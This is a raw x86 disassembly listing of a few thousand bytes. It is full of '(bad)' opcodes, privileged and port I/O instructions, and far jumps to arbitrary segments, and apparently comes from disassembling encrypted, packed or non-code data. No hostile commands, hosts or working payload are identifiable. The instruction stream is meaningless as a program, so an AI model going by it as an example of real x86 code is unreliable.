  4205bb:	inc    eax
  4205bc:	push   edx
  4205bd:	int    0x56
  4205bf:	jp     0x420597
  4205c1:	mov    dl,0x1a
  4205c3:	cmpps  xmm6,XMMWORD PTR [esi-0x22],0x7b
  4205c8:	inc    ebx
  4205c9:	jne    0x4205dc
  4205cb:	je     0x420606
  4205cd:	mov    cl,0xf2
  4205cf:	mov    bl,0x85
  4205d1:	wrmsr  
  4205d3:	or     ebp,DWORD PTR [eax]
  4205d5:	call   0xee402c75
  4205da:	pop    ebx
  4205db:	mov    cl,0x98
  4205dd:	pop    es
  4205de:	push   esi
  4205df:	enter  0x4469,0x3f
  4205e3:	jl     0x420657
  4205e5:	add    bh,bl
  4205e7:	test   BYTE PTR [ebx+0x44],bh
  4205ea:	add    DWORD PTR [ecx+0x3f02015f],esi
  4205f0:	xchg   edx,eax
  4205f1:	test   eax,0xee52e9ac
  4205f6:	aad    0x45
  4205f8:	pop    es
  4205f9:	pop    ds
  4205fa:	mov    BYTE PTR ds:[ecx-0x2d2f779d],dl
  420601:	test   eax,0xf455353d
  420606:	mov    ah,0xa1
  420608:	lods   eax,DWORD PTR ds:[esi]
  420609:	int    0x1b
  42060b:	sbb    eax,0x15cc8e72
  420610:	push   edx
  420611:	loope  0x4205a7
  420613:	jp     0x420690
  420615:	loop   0x420631
  420617:	mov    ebp,0x6d99c311
  42061c:	aaa    
  42061d:	jae    0x420657
  42061f:	int3   
  420620:	aam    0x15
  420622:	imul   esi,DWORD PTR [ecx-0xd],0x69
  420626:	je     0x4205c9
  420628:	mov    cl,0xa3
  42062a:	push   ds
  42062b:	and    al,0x55
  42062d:	adc    BYTE PTR [edx],cl
  42062f:	jg     0x420693
  420631:	sbb    ebp,DWORD PTR [ebx+0x13]
  420634:	aas    
  420635:	popa   
  420636:	jecxz  0x4205e9
  420638:	mov    edi,0xb51dbe69
  42063d:	xor    eax,0x21a905a
  420642:	mov    edi,0x98fa4f95
  420647:	not    ebx
  420649:	cwde   
  42064a:	iret   
  42064b:	mov    ch,0x4
  42064d:	in     eax,dx
  42064e:	shl    BYTE PTR [ebx+0x777912bb],1
  420654:	int    0xf3
  420656:	in     eax,0xc6
  420658:	xchg   edi,esp
  42065a:	push   edi
  42065b:	in     eax,dx
  42065c:	add    al,0xee
  42065e:	mov    BYTE PTR [ebp-0x329c3a24],0x69
  420665:	push   0x49
  420667:	addr16 ret 
  420669:	hlt    
  42066a:	dec    edi
  42066b:	dec    edx
  42066c:	push   ds
  42066d:	mov    ecx,?
  42066f:	mov    ds:0xf1295c9b,al
  420674:	sub    BYTE PTR [edx],cl
  420676:	adc    al,0x38
  420678:	out    dx,eax
  420679:	lea    ebx,[edx]
  42067b:	and    BYTE PTR [ebx-0x720cf7d2],ah
  420681:	jns    0x4206dd
  420683:	mov    WORD PTR [ebp-0x216bf71b],?
  420689:	inc    edi
  42068a:	test   al,0x42
  42068c:	and    BYTE PTR [edi+0x21f2b92e],dh
  420692:	cmp    al,0x25
  420694:	sbb    eax,0xd0fa5fbc
  420699:	xor    esp,DWORD PTR [edx]
  42069b:	inc    ebp
  42069c:	(bad)
  42069f:	sub    ebx,0xffffffda
  4206a2:	push   0xf4b06082
  4206a7:	into   
  4206a8:	or     eax,0xef380dbb
  4206ad:	mov    cs,WORD PTR ds:0x45c3312e
  4206b3:	fldenv [esi-0x3742f2b5]
  4206b9:	or     al,0x2b
  4206bb:	lea    ebx,[ebp+0x18c73ecd]
  4206c1:	mov    DWORD PTR [edx+0x45],esp
  4206c4:	(bad)  [ebx]
  4206c6:	cmc    
  4206c7:	arpl   WORD PTR [ebp+0x623fd6e8],cx
  4206cd:	cmp    cl,0xe5
  4206d0:	pop    esi
  4206d1:	iret   
  4206d2:	inc    esp
  4206d3:	push   0xffffff89
  4206d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206d6:	in     al,dx
  4206d7:	into   
  4206d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206d9:	jns    0x4206c0
  4206db:	inc    edx
  4206dc:	(bad)  
  4206dd:	pop    ebx
  4206de:	and    ah,bl
  4206e0:	loopne 0x4206be
  4206e2:	cld    
  4206e3:	xor    BYTE PTR [esi+0x72],bl
  4206e6:	jecxz  0x42074f
  4206e8:	mov    ecx,0x22bc8954
  4206ed:	cmp    eax,0x152ab862
  4206f2:	sbb    al,0xe5
  4206f4:	sahf   
  4206f5:	mov    BYTE PTR [edx+0x71],dh
  4206f8:	xor    DWORD PTR [ebx+0x43],edi
  4206fb:	jge    0x4206bc
  4206fd:	xor    ebx,ebx
  4206ff:	inc    eax
  420700:	bnd ret 
  420702:	(bad)  
  420703:	or     esp,DWORD PTR [ebp-0x481d3874]
  420709:	xor    esi,DWORD PTR [ecx-0x39]
  42070c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42070d:	int    0x69
  42070f:	int3   
  420710:	mov    al,ds:0xd929f046
  420715:	sbb    ch,BYTE PTR [edx+ebp*8-0x7d]
  420719:	ins    BYTE PTR es:[edi],dx
  42071a:	sti    
  42071b:	mov    DWORD PTR ds:0x70a8e755,edi
  420721:	mov    al,ds:0xcdc3656
  420726:	dec    edx
  420727:	lods   al,BYTE PTR ds:[esi]
  420728:	sub    ecx,esi
  42072a:	jmp    0xfbb6c926
  42072f:	jecxz  0x420718
  420731:	jmp    0x7f62248e
  420736:	mov    eax,ds:0x530af2de
  42073b:	jne    0x420729
  42073d:	(bad)  
  42073f:	rcr    bl,1
  420741:	addr16 jmp 0xb305:0x2c5ca895
  420749:	lock sub eax,0xdf3b029b
  42074f:	(bad)  
  420752:	retf   
  420753:	jbe    0x4207af
  420755:	out    dx,eax
  420756:	jecxz  0x42079b
  420758:	out    0xdd,eax
  42075a:	out    0xda,al
  42075c:	dec    eax
  42075d:	sti    
  42075e:	dec    ebp
  42075f:	push   eax
  420760:	and    eax,0xf4ba5195
  420765:	add    DWORD PTR [ecx],ebx
  420767:	gs or  al,0xa2
  42076a:	scas   al,BYTE PTR es:[edi]
  42076b:	jo     0x4206fc
  42076d:	out    dx,eax
  42076e:	fidivr WORD PTR [ecx-0x32]
  420771:	pushw  0xffb0
  420774:	sub    al,0xf4
  420776:	lahf   
  420777:	or     cl,ch
  420779:	fidiv  WORD PTR [ebp-0x80]
  42077c:	mov    ebx,DWORD PTR [ecx+0x49]
  42077f:	pop    ds
  420780:	sub    esi,DWORD PTR [ebx-0x56]
  420783:	dec    ebp
  420784:	mov    eax,0xcef75326
  420789:	adc    eax,0xb1677511
  42078e:	push   ebp
  42078f:	fst    QWORD PTR ds:0xb7eb66b6
  420795:	repnz sub eax,DWORD PTR [esi-0x47]
  420799:	mov    edx,0xd2236fcb
  42079e:	test   BYTE PTR [edi-0x7b01bcef],dl
  4207a4:	sub    al,0xf9
  4207a6:	or     BYTE PTR [edx+edx*8-0x55a3973],0x94
  4207ae:	stos   DWORD PTR es:[edi],eax
  4207af:	mov    ebx,DWORD PTR [eax]
  4207b1:	lds    ecx,FWORD PTR [eax-0x1c6ae81a]
  4207b7:	cmc    
  4207b8:	in     al,0xef
  4207ba:	int    0x7a
  4207bc:	popf   
  4207bd:	xchg   eax,ecx
  4207bf:	cmp    ch,BYTE PTR [edi]
  4207c1:	pop    es
  4207c2:	or     DWORD PTR [edx+0xa],ebp
  4207c5:	cwde   
  4207c6:	popa   
  4207c7:	push   es
  4207c8:	push   ebx
  4207c9:	mov    edi,0x98d23106
  4207ce:	jo     0x42080c
  4207d0:	push   esi
  4207d1:	dec    edx
  4207d2:	mov    DWORD PTR [edx+0x62fd497a],edx
  4207d8:	outs   dx,DWORD PTR ds:[esi]
  4207d9:	dec    ecx
  4207da:	shl    edx,0xb2
  4207dd:	jnp    0x420779
  4207df:	sbb    eax,0x67c8a6bb
  4207e4:	inc    esp
  4207e5:	jmp    0x75142fbd
  4207ea:	pop    eax
  4207eb:	das    
  4207ec:	ins    BYTE PTR es:[edi],dx
  4207ed:	int3   
  4207ee:	sahf   
  4207ef:	stos   DWORD PTR es:[edi],eax
  4207f0:	xchg   edx,eax
  4207f1:	and    al,ch
  4207f3:	mov    WORD PTR [eax],cs
  4207f5:	sahf   
  4207f6:	mov    al,0x6f
  4207f8:	and    DWORD PTR [ebp+ecx*2-0x73],esp
  4207fc:	inc    eax
  4207fd:	pusha  
  4207fe:	leave  
  4207ff:	call   0xa5f7:0x103fc3bc
  420806:	mov    ds:0xda1677f,al
  42080b:	retf   0xbbc0
  42080e:	fstp   TBYTE PTR [ebx+0x7fe5013c]
  420814:	popw   ds
  420816:	mov    ds,WORD PTR [ecx+0x708299f5]
  42081c:	push   ebx
  42081d:	iret   
  42081e:	test   BYTE PTR [edx-0x229a1206],al
  420824:	jle    0x42082a
  420826:	into   
  420827:	cmp    BYTE PTR [edi],0xa3
  42082a:	adc    eax,0xf0fb0999
  42082f:	leave  
  420830:	popf   
  420831:	ffreep st(0)
  420833:	dec    edx
  420834:	es mov bh,0x4
  420837:	xchg   esp,eax
  420838:	ror    DWORD PTR [ecx],1
  42083a:	pop    edi
  42083b:	(bad)  
  42083d:	and    al,0x61
  42083f:	or     esi,edx
  420841:	and    al,0xfe
  420843:	sub    DWORD PTR [ecx],ebx
  420845:	cld    
  420846:	dec    edi
  420847:	rcl    DWORD PTR [edi+0x69],0x74
  42084b:	test   DWORD PTR [eax-0x2cf7d90b],0x78edd068
  420855:	jne    0x420890
  420857:	and    ebx,esi
  420859:	jno    0x42081d
  42085b:	jbe    0x420819
  42085d:	add    ch,0x3f
  420860:	pop    ss
  420861:	pop    es
  420862:	add    eax,0xff8b85e7
  420867:	(bad)  
  420868:	ror    BYTE PTR [eax],0x4e
  42086b:	jo     0x420812
  42086d:	xlat   BYTE PTR ds:[ebx]
  42086e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42086f:	adc    al,0xa0
  420871:	mov    bh,0xf7
  420873:	mov    ebx,0x593adb18
  420878:	and    DWORD PTR [edx],ebp
  42087a:	adc    al,0x4a
  42087c:	test   edi,esp
  42087e:	fcomp  QWORD PTR [edx]
  420880:	mov    eax,0x67a845dc
  420885:	jg     0x420830
  420887:	xor    eax,esi
  420889:	pop    ecx
  42088a:	adc    ebp,DWORD PTR [eax-0x6]
  42088d:	retf   0x8c24
  420890:	loopne 0x42085a
  420892:	aas    
  420893:	jp     0x420900
  420895:	popf   
  420896:	lods   eax,DWORD PTR ds:[esi]
  420897:	lods   al,BYTE PTR ds:[esi]
  420898:	movntps XMMWORD PTR [esi+0x58],xmm7
  42089c:	sub    al,0x1c
  42089e:	mov    ?,WORD PTR [edx+0x49f2b55f]
  4208a4:	fs mov cl,0x9c
  4208a7:	jmp    0xb246:0x29c54688
  4208ae:	popf   
  4208af:	int3   
  4208b0:	mov    dl,0x5d
  4208b2:	aad    0xc6
  4208b4:	inc    ebp
  4208b5:	aas    
  4208b6:	fcmovne st,st(1)
  4208b8:	sub    eax,0x3a98c511
  4208bd:	cwde   
  4208be:	pcmpeqw mm4,QWORD PTR [esi-0x604bffc]
  4208c5:	mov    eax,0xc01d4175
  4208ca:	sub    al,0x3c
  4208cc:	mov    al,ds:0xc1641065
  4208d1:	das    
  4208d2:	out    dx,eax
  4208d3:	dec    edx
  4208d4:	cmp    DWORD PTR [ecx+0x5215e1e6],edx
  4208da:	shl    DWORD PTR [esi+0x6d],cl
  4208dd:	inc    ecx
  4208de:	rcl    DWORD PTR [ecx+0x17ef0ff4],cl
  4208e4:	out    dx,al
  4208e5:	js     0x42095f
  4208e7:	push   ebx
  4208e8:	mov    cl,al
  4208ea:	inc    esi
  4208eb:	jnp    0x4208a0
  4208ed:	mov    ebx,0xe0381c6d
  4208f2:	xchg   esi,ebx
  4208f4:	push   cs
  4208f5:	push   eax
  4208f6:	push   esp
  4208f7:	div    eax
  4208f9:	ds jns 0x42088f
  4208fc:	jbe    0x4208d1
  4208fe:	xchg   edx,eax
  4208ff:	jne    0x420972
  420901:	retf   
  420902:	inc    ecx
  420903:	bound  ebp,QWORD PTR [eax+0x6a]
  420906:	test   al,0xd2
  420908:	test   BYTE PTR [edx+ebp*4],ah
  42090b:	sbb    DWORD PTR [ebp+0x2c4008d7],0xfdeeafd6
  420915:	adc    eax,0xbaaddf8f
  42091a:	shr    DWORD PTR [bx+di-0x4f19],0x31
  420920:	and    eax,0xd3f9fcc1
  420925:	mov    dl,0x96
  420927:	mov    ecx,0xfaa18219
  42092c:	push   cs
  42092d:	or     al,0xd4
  42092f:	outs   dx,DWORD PTR ds:[esi]
  420930:	mov    eax,ds:0x6c835906
  420935:	xchg   esi,eax
  420936:	or     ebp,DWORD PTR [ebx+0x75]
  420939:	jmp    0x420950
  42093b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42093c:	inc    ecx
  42093d:	xchg   ecx,eax
  42093e:	out    dx,eax
  42093f:	mov    ah,bh
  420941:	push   edx
  420942:	test   DWORD PTR [eax],ebx
  420944:	(bad)
  420948:	fdivr  DWORD PTR [edx]
  42094a:	sbb    al,0x90
  42094c:	clc    
  42094d:	xchg   ebx,eax
  42094e:	(bad)  
  42094f:	xor    eax,0xdee41f3f
  420954:	neg    ebx
  420956:	inc    ebp
  420957:	xchg   BYTE PTR [ecx-0x211e1c21],dh
  42095d:	xchg   BYTE PTR [edx+0x13],dh
  420960:	or     dl,dl
  420962:	in     al,dx
  420963:	push   es
  420964:	int3   
  420965:	dec    ecx
  420966:	call   0x483dfb9d
  42096b:	rcl    DWORD PTR [edi+0x68],cl
  42096e:	iret   
  42096f:	pmullw mm2,QWORD PTR [eax]
  420972:	(bad)  
  420973:	xchg   edi,eax
  420974:	sub    al,0xa4
  420976:	mov    BYTE PTR [ecx],cl
  420978:	pop    ds
  420979:	lock test DWORD PTR [ebx+ebp*8],esp
  42097d:	push   0xffffffb3
  42097f:	xchg   DWORD PTR [edx+eiz*4],edx
  420982:	int    0xc
  420984:	fnstsw WORD PTR [ebx-0x62]
  420987:	daa    
  420988:	push   ss
  420989:	das    
  42098a:	stc    
  42098b:	push   ds
  42098c:	retf   0x6216
  42098f:	clc    
  420990:	cld    
  420991:	pop    edi
  420992:	and    cl,BYTE PTR [edx]
  420994:	repz ror ch,0xf3
  420998:	pop    eax
  420999:	mov    dh,0x8d
  42099b:	jns    0x42097c
  42099d:	repnz or BYTE PTR [edi-0x5a],al
  4209a1:	mov    esp,0x90c85790
  4209a6:	dec    ebx
  4209a7:	sub    DWORD PTR [ecx-0x24],esi
  4209aa:	rol    DWORD PTR [ecx-0x41ddb10d],cl
  4209b0:	inc    edx
  4209b1:	push   edx
  4209b2:	mov    al,ds:0xc7bccba1
  4209b7:	fs or  esi,esp
  4209ba:	pminsw mm0,QWORD PTR [edi+0x6]
  4209be:	repz sbb DWORD PTR [ecx+0x4e],edx
  4209c2:	push   cs
  4209c3:	fs mov ecx,0xe19e5cf1
  4209c9:	fldcw  WORD PTR cs:[ebx+0x60]
  4209cd:	cmp    DWORD PTR [esp+esi*4+0x225ca218],edx
  4209d4:	sub    dl,BYTE PTR [edx-0x27201ee0]
  4209da:	adc    eax,0xafce38c
  4209df:	imul   esp,ebp,0xffffffc5
  4209e2:	add    eax,0x79ea64b4
  4209e7:	xchg   BYTE PTR [eax+0x34],ch
  4209ea:	push   esp
  4209eb:	lods   eax,DWORD PTR ds:[esi]
  4209ec:	rcr    BYTE PTR [edi],1
  4209ee:	mov    edi,0xe7c94128
  4209f3:	add    eax,0xd9992bc7
  4209f8:	(bad)  
  4209f9:	into   
  4209fa:	jae    0x420a09
  4209fc:	push   cs
  4209fd:	push   0x7f
  4209ff:	popa   
  420a00:	xchg   DWORD PTR [ebp+0x60ae8e8c],esp
  420a06:	repnz test eax,0xad3537ee
  420a0c:	push   ds
  420a0d:	jo     0x4209d5
  420a0f:	rol    BYTE PTR [edi+edi*8+0x4db9affc],1
  420a16:	add    ah,BYTE PTR [esp+ebp*8]
  420a19:	(bad)  
  420a1a:	xor    esp,ecx
  420a1c:	jno    0x4209af
  420a1e:	mov    bh,0xc6
  420a20:	out    dx,al
  420a21:	fadd   DWORD PTR [ebx+edx*1+0x64]
  420a25:	adc    al,0xbc
  420a27:	call   0x6c38:0x11d173e7
  420a2e:	mov    ebx,0x95e749bc
  420a33:	pop    es
  420a34:	in     al,0x84
  420a36:	aam    0xaf
  420a38:	sub    al,0x94
  420a3a:	mov    BYTE PTR [ecx-0x39979a66],bh
  420a40:	fwait
  420a41:	cmp    BYTE PTR [edi+esi*4],dh
  420a44:	cmc    
  420a45:	fmulp  st(3),st
  420a47:	aas    
  420a48:	inc    edx
  420a49:	sbb    esi,DWORD PTR [esi]
  420a4b:	rol    esi,1
  420a4d:	outs   dx,BYTE PTR ds:[esi]
  420a4e:	outs   dx,BYTE PTR ds:[esi]
  420a4f:	cmp    al,0xe1
  420a51:	mov    eax,ds:0x6ce70bf0
  420a56:	jb     0x420a0b
  420a58:	push   ds
  420a59:	pop    es
  420a5a:	clc    
  420a5b:	addr16 ret 0xebe0
  420a5f:	or     esp,DWORD PTR [ebx+esi*4-0xc]
  420a63:	jp     0x420aa5
  420a65:	jle    0x420a93
  420a67:	dec    esi
  420a68:	push   ebx
  420a69:	fild   QWORD PTR ds:0x86f8c995
  420a6f:	in     eax,0x28
  420a71:	and    edi,0x16c1ee04
  420a77:	push   ebx
  420a78:	fs pop es
  420a7a:	dec    ecx
  420a7b:	fild   QWORD PTR [eax-0x73]
  420a7e:	lds    edx,FWORD PTR [ebx+0x2f]
  420a81:	shr    BYTE PTR [edi-0x64],1
  420a84:	sub    ah,BYTE PTR [edx-0x7b6aa112]
  420a8a:	outs   dx,BYTE PTR ds:[esi]
  420a8b:	mov    bl,0x6c
  420a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a8e:	icebp  
  420a8f:	sbb    al,0x6b
  420a91:	into   
  420a92:	adc    dl,BYTE PTR [edx+0x619af4dc]
  420a98:	adc    ch,BYTE PTR [esi-0x6]
  420a9b:	fdivp  st(1),st
  420a9d:	hlt    
  420a9e:	leave  
  420a9f:	dec    ebp
  420aa0:	jmp    0x420a29
  420aa2:	rcr    DWORD PTR [edx+0x1d],0xbf
  420aa6:	sub    al,0x97
  420aa8:	or     BYTE PTR ds:0x56a6021b,dl
  420aae:	jmp    0xd24f:0xadb781f7
  420ab5:	and    bh,BYTE PTR [eax+0x4b12724e]
  420abb:	cmp    BYTE PTR [edx+0x1a6d7d51],0x0
  420ac2:	(bad)  
  420ac3:	jae    0x420b0a
  420ac5:	std    
  420ac6:	pop    eax
  420ac7:	das    
  420ac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ac9:	push   0x362a042c
  420ace:	loop   0x420b12
  420ad0:	std    
  420ad1:	mov    edx,0xe96b4a67
  420ad6:	bound  esi,QWORD PTR [esi+eax*4-0x1a111f9c]
  420add:	mov    cl,ch
  420adf:	aad    0x51
  420ae1:	ret    0x6b74
  420ae4:	mov    bl,0x25
  420ae6:	and    dh,dl
  420ae8:	pop    eax
  420ae9:	adc    al,BYTE PTR [edx+0x300762c1]
  420aef:	retf   0xdb68
  420af2:	dec    ecx
  420af3:	ss das 
  420af5:	push   eax
  420af6:	and    edx,DWORD PTR [edx]
  420af8:	call   0xa0af:0x849212eb
  420aff:	cld    
  420b00:	mov    eax,ds:0xd719aab3
  420b05:	pop    ss
  420b06:	fstp   DWORD PTR [ecx+0x3]
  420b09:	mov    ds,WORD PTR [esi]
  420b0b:	dec    edx
  420b0c:	out    0x7f,eax
  420b0e:	xchg   dl,bh
  420b10:	in     eax,dx
  420b11:	lods   al,BYTE PTR ds:[esi]
  420b12:	and    DWORD PTR [esi],0x5edeff36
  420b18:	(bad)  
  420b19:	push   ebx
  420b1a:	imul   ebx
  420b1c:	push   0xd30b4b70
  420b21:	mov    edx,0x181485c7
  420b26:	ins    DWORD PTR es:[edi],dx
  420b27:	dec    edi
  420b28:	in     al,dx
  420b29:	popa   
  420b2a:	ret    
  420b2b:	xchg   edi,eax
  420b2c:	repz add bh,dh
  420b2f:	push   edi
  420b30:	xor    esp,esi
  420b32:	inc    ebx
  420b33:	js     0x420ad5
  420b35:	fcom   st(2)
  420b37:	jno    0x420b6c
  420b39:	scas   eax,DWORD PTR es:[edi]
  420b3a:	popf   
  420b3b:	push   es
  420b3c:	(bad)  [esi-0x3a567559]
  420b42:	cwde   
  420b43:	out    dx,al
  420b44:	lock sbb al,0x90
  420b47:	xchg   esi,eax
  420b48:	out    0x42,al
  420b4a:	adc    eax,0x783160e6
  420b4f:	or     esi,DWORD PTR [ebp-0x3d]
  420b52:	test   BYTE PTR [ecx-0x462eb871],ah
  420b58:	or     eax,ebx
  420b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b5b:	jne    0x420b62
  420b5d:	xor    DWORD PTR [ecx+0x576c2fd9],esp
  420b63:	adc    BYTE PTR [edi+0x46],al
  420b66:	enter  0x3d7e,0x45
  420b6a:	(bad)  
  420b6b:	std    
  420b6c:	test   ebp,0xa24ab304
  420b72:	and    al,0x8b
  420b74:	sbb    DWORD PTR [ecx],esp
  420b76:	xor    DWORD PTR ds:0x6c3e0d9b,ebp
  420b7c:	(bad)  
  420b7e:	xlat   BYTE PTR ds:[ebx]
  420b7f:	mov    edx,0x35c12503
  420b84:	inc    ebp
  420b85:	jmp    0x82d8:0xca4dd9cb
  420b8c:	(bad)  
  420b8f:	out    0xd4,al
  420b91:	adc    ah,bh
  420b93:	add    BYTE PTR [ecx+eax*8+0x3617d2a2],0xb2
  420b9b:	nop
  420b9c:	xor    ch,0x13
  420b9f:	jp     0x420b76
  420ba1:	dec    eax
  420ba2:	jge    0x420b75
  420ba4:	test   eax,0xdda05c63
  420ba9:	dec    edx
  420baa:	cdq    
  420bab:	xor    al,0x68
  420bad:	cmp    cl,BYTE PTR ds:[ecx+0x10a98cd6]
  420bb4:	push   edi
  420bb5:	jmp    0x5054ff83
  420bba:	out    dx,eax
  420bbb:	xchg   DWORD PTR ds:0xe65fc403,ebp
  420bc1:	mov    dh,0x1
  420bc3:	add    dl,bl
  420bc5:	or     eax,0x3ac1d25a
  420bca:	int    0xe5
  420bcc:	fcmovnu st,st(7)
  420bce:	sar    esi,0x48
  420bd1:	and    ch,ah
  420bd3:	adc    eax,0xb6f7d99c
  420bd8:	leave  
  420bd9:	jo     0x420b8d
  420bdb:	lods   al,BYTE PTR ds:[esi]
  420bdc:	ret    0x9925
  420bdf:	arpl   WORD PTR [ecx],si
  420be1:	fisttp WORD PTR [eax]
  420be3:	rcr    DWORD PTR [eax+ebp*8-0x5],0x34
  420be8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420be9:	ins    BYTE PTR es:[edi],dx
  420bea:	xchg   esi,eax
  420beb:	jae    0x420ba9
  420bed:	push   es
  420bee:	nop
  420bef:	mov    ds:0x11d15f6e,al
  420bf4:	adc    dl,0xc9
  420bf7:	push   eax
  420bf8:	and    dl,BYTE PTR ds:0x6efdc416
  420bfe:	mov    edi,0xf8a94049
  420c03:	mov    DWORD PTR [ebx],esi
  420c05:	jae    0x420bf2
  420c07:	ins    DWORD PTR es:[edi],dx
  420c08:	loopne 0x420c46
  420c0a:	sub    esi,DWORD PTR [ecx+ecx*2-0x4d8f7e17]
  420c11:	dec    edi
  420c12:	fistp  QWORD PTR [esi+0x2e]
  420c15:	push   ebx
  420c16:	popa   
  420c17:	mov    edi,0x3b820e6c
  420c1c:	popa   
  420c1d:	scas   eax,DWORD PTR es:[edi]
  420c1e:	ja     0x420bd4
  420c20:	(bad)  [ebx-0x5c919876]
  420c26:	push   esi
  420c27:	leave  
  420c28:	jmp    0x8b59:0x7113096a
  420c2f:	fldcw  WORD PTR [edx+0x65]
  420c32:	pop    ds
  420c33:	rcl    cl,cl
  420c35:	repz push esp
  420c37:	imul   esp,DWORD PTR [eax-0x76],0xffffffa4
  420c3b:	icebp  
  420c3c:	add    BYTE PTR [esi],ah
  420c3e:	xchg   DWORD PTR [ebx],ebp
  420c40:	ds into 
  420c42:	ins    BYTE PTR es:[edi],dx
  420c43:	push   0xd5b74543
  420c48:	adc    DWORD PTR [edi],esi
  420c4a:	mov    dh,0x59
  420c4c:	jmp    0x8beded06
  420c51:	lods   al,BYTE PTR ds:[esi]
  420c52:	mov    ah,0x84
  420c54:	add    bl,BYTE PTR [esi]
  420c56:	pop    ebx
  420c57:	out    0xe,eax
  420c59:	ror    DWORD PTR [esp+ecx*4-0x1221d9c4],cl
  420c60:	test   al,0xc9
  420c62:	lods   eax,DWORD PTR ds:[esi]
  420c63:	add    edi,DWORD PTR [edx+eax*8]
  420c66:	sub    BYTE PTR [edx+0x1e],ch
  420c69:	mov    ecx,0x1b50e01b
  420c6e:	ret    0x9e2e
  420c71:	or     ecx,0xe8ffee3b
  420c77:	jecxz  0x420c06
  420c79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c7a:	push   cs
  420c7b:	adc    al,0x1c
  420c7d:	and    eax,0xcda590c6
  420c82:	js     0x420ca6
  420c84:	popa   
  420c85:	gs cmp cl,0x7f
  420c89:	in     eax,dx
  420c8a:	mov    ah,0xd7
  420c8c:	push   edx
  420c8d:	mov    eax,ds:0x9e1d9f6d
  420c92:	int    0x51
  420c94:	pushf  
  420c95:	jb     0x420c54
  420c97:	sub    al,0xa2
  420c99:	xchg   ebp,eax
  420c9a:	fld    TBYTE PTR [ecx+0x4c]
  420c9d:	xor    esi,ebp
  420c9f:	fldcw  WORD PTR [edx-0x10]
  420ca2:	sbb    ah,BYTE PTR [esi+edi*4-0x11]
  420ca6:	xchg   DWORD PTR [eax],esp
  420ca8:	sti    
  420ca9:	or     DWORD PTR [edx-0x6df6b6c0],edi
  420caf:	pop    edi
  420cb0:	scas   eax,DWORD PTR es:[edi]
  420cb1:	inc    eax
  420cb2:	push   esi
  420cb3:	ins    DWORD PTR es:[edi],dx
  420cb4:	mov    cl,0x1c
  420cb6:	jp     0x420c76
  420cb8:	mov    ah,0x8d
  420cba:	add    al,0x61
  420cbc:	fst    DWORD PTR [eax+ebx*8+0x1b]
  420cc0:	inc    ecx
  420cc1:	out    dx,eax
  420cc2:	and    al,0x19
  420cc4:	mov    al,0x25
  420cc6:	lahf   
  420cc7:	mov    ebx,0x5d4418db
  420ccc:	jl     0x420d1e
  420cce:	cmp    BYTE PTR [ecx-0x58b85945],al
  420cd4:	pop    ebx
  420cd5:	dec    esp
  420cd6:	int    0x20
  420cd8:	pusha  
  420cd9:	loop   0x420cdd
  420cdb:	jns    0x420cf3
  420cdd:	into   
  420cde:	sbb    BYTE PTR [ebp+0x28302d6d],bh
  420ce4:	ficom  DWORD PTR [eax-0x1864eda0]
  420cea:	xor    al,0x97
  420cec:	ins    BYTE PTR es:[edi],dx
  420ced:	lods   al,BYTE PTR ds:[esi]
  420cee:	xchg   ecx,eax
  420cef:	inc    esi
  420cf0:	rol    DWORD PTR [edx+0x4f],0x9e
  420cf4:	scas   eax,DWORD PTR es:[edi]
  420cf5:	cmp    BYTE PTR [esi],ch
  420cf7:	push   ebx
  420cf8:	cwde   
  420cf9:	into   
  420cfa:	cmp    BYTE PTR [esi+ebx*2-0x1f],bl
  420cfe:	daa    
  420cff:	sub    BYTE PTR ds:0x5cc7563d,dl
  420d05:	xchg   esp,eax
  420d06:	adc    eax,0xe537915b
  420d0b:	or     al,0x6b
  420d0d:	rcr    BYTE PTR [esi],cl
  420d0f:	jmp    FWORD PTR [ebx]
  420d11:	push   edx
  420d12:	add    al,0x1c
  420d14:	adc    bl,BYTE PTR [ebx]
  420d16:	xchg   ebx,eax
  420d17:	int    0xac
  420d19:	popa   
  420d1a:	lea    edi,[esi]
  420d1c:	sub    eax,esi
  420d1e:	xchg   ebx,eax
  420d1f:	imul   ecx,DWORD PTR gs:[eax-0x5e],0x519afbbc
  420d27:	mov    al,ds:0x646f4ddc
  420d2c:	repnz push ss
  420d2e:	adc    eax,0x15edd343
  420d33:	inc    DWORD PTR [eax-0x7e]
  420d36:	inc    ecx
  420d37:	popa   
  420d38:	lock mov ch,0xda
  420d3b:	jg     0x420d38
  420d3d:	xor    eax,0x1f2287a6
  420d42:	ss js  0x420dab
  420d45:	add    ch,BYTE PTR [ecx]
  420d47:	out    dx,al
  420d48:	inc    ecx
  420d49:	in     al,0x29
  420d4b:	gs and al,0x7f
  420d4e:	push   ecx
  420d4f:	xchg   edi,eax
  420d50:	iret   
  420d51:	in     al,dx
  420d52:	adc    BYTE PTR [ecx+0x22],ch
  420d55:	outs   dx,BYTE PTR ds:[esi]
  420d56:	add    al,0xac
  420d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d59:	in     al,dx
  420d5a:	idiv   ecx
  420d5c:	fs pop ds
  420d5e:	sbb    BYTE PTR [edx],dh
  420d60:	adc    dh,BYTE PTR [ebp-0x7e]
  420d63:	out    dx,eax
  420d64:	retf   
  420d65:	leave  
  420d66:	iret   
  420d67:	mov    BYTE PTR [ecx],cl
  420d69:	lds    ebp,FWORD PTR [esi+esi*1-0x7c32af88]
  420d70:	or     bl,BYTE PTR [esi+0x56f7e7b3]
  420d76:	adc    DWORD PTR [ecx],eax
  420d78:	xchg   edi,eax
  420d79:	mov    bh,0xf2
  420d7b:	call   FWORD PTR [ebx-0x53]
  420d7e:	sbb    BYTE PTR [edx+ebp*1+0x558e9ab4],dl
  420d85:	fnsave [edx+ebx*2-0x1b]
  420d89:	cmp    BYTE PTR [ecx],dl
  420d8b:	dec    edx
  420d8c:	(bad)  
  420d8d:	sub    ebp,DWORD PTR [edi+eiz*1+0x9]
  420d91:	cwde   
  420d92:	inc    esp
  420d93:	call   0x7699:0x3ad1e99
